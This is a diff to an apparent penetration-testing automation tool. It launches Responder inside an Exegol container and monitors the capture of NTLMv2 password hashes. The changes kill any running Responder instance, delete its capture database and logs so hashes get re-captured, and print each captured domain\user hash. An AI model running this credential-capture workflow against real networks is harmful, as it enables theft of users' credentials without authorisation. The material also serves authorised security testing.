@@ -636,12 +636,18 @@ sys.exit(1)
             timeout=5
         )
         if ret == 0 and stdout.strip() and 'Responder.py' in stdout:
-            self.print_warning("Responder is already running")
-            self.print_line(f"  {stdout.strip()[:80]}")
-            return True
+            self.print_warning("Responder is already running, killing it first...")
+            self.run_in_exegol("pkill -f 'Responder.py' 2>/dev/null; sleep 1", timeout=5)
+
+        # Clear Responder database and logs to avoid "skipping previously captured" issues
+        self.run_in_exegol(
+            "rm -f /opt/tools/Responder/Responder.db /opt/tools/Responder/logs/*.txt /opt/tools/Responder/logs/*.log 2>/dev/null",
+            timeout=5
+        )
+        self.print_status("Cleared previous Responder captures")
 
         # Start Responder in background
-        responder_cmd = f"nohup /opt/tools/Responder/venv/bin/python3 /opt/tools/Responder/Responder.py -I {interface} > /tmp/responder.log 2>&1 &"
+        responder_cmd = f"nohup /opt/tools/Responder/venv/bin/python3 /opt/tools/Responder/Responder.py -I {interface} -v > /tmp/responder.log 2>&1 &"
         ret, stdout, stderr = self.run_in_exegol(responder_cmd, timeout=10)
 
         # Give it a moment to start
@@ -691,9 +697,26 @@ sys.exit(1)
         initial_hashes = self._captured_hashes.copy()
         new_hashes = []
         start_time = time.time()
+        last_log_pos = 0
 
         try:
             while time.time() - start_time < timeout:
+                # Show new Responder log output
+                ret, log_output, _ = self.run_in_exegol(
+                    f"tail -c +{last_log_pos + 1} /tmp/responder.log 2>/dev/null | grep -E '(NTLMv|captured|hash|Skipping)' | tail -5",
+                    timeout=5
+                )
+                if log_output and log_output.strip():
+                    for line in log_output.strip().split('\n'):
+                        if line.strip() and 'Skipping' not in line:
+                            self.print_status(f"[Responder] {line.strip()}")
+
+                # Update log position
+                ret, size, _ = self.run_in_exegol("wc -c < /tmp/responder.log 2>/dev/null", timeout=5)
+                if size and size.strip().isdigit():
+                    last_log_pos = int(size.strip())
+
+                # Check for new hashes
                 current_hashes = self._get_existing_hashes()
                 new_ones = current_hashes - initial_hashes
 
@@ -705,7 +728,14 @@ sys.exit(1)
                             parts = h.split('::')
                             if len(parts) >= 2:
                                 user = parts[0]
-                                self.print_good(f"Captured hash for: {user}")
+                                domain = parts[1] if len(parts) > 1 else ""
+                                self.print_good(f"Captured NTLMv2 hash: {domain}\\{user}")
+
+                # Show remaining time every 15 seconds
+                elapsed = int(time.time() - start_time)
+                remaining = timeout - elapsed
+                if elapsed > 0 and elapsed % 15 == 0:
+                    self.print_status(f"Waiting... {remaining}s remaining")
 
                 time.sleep(2)
 
@@ -715,6 +745,8 @@ sys.exit(1)
         if new_hashes:
             self.print_line()
             self.print_good(f"Captured {len(new_hashes)} new hash(es)")
+            for h in new_hashes:
+                self.print_line(f"  {h[:80]}...")
         else:
             self.print_warning("No new hashes captured")
 
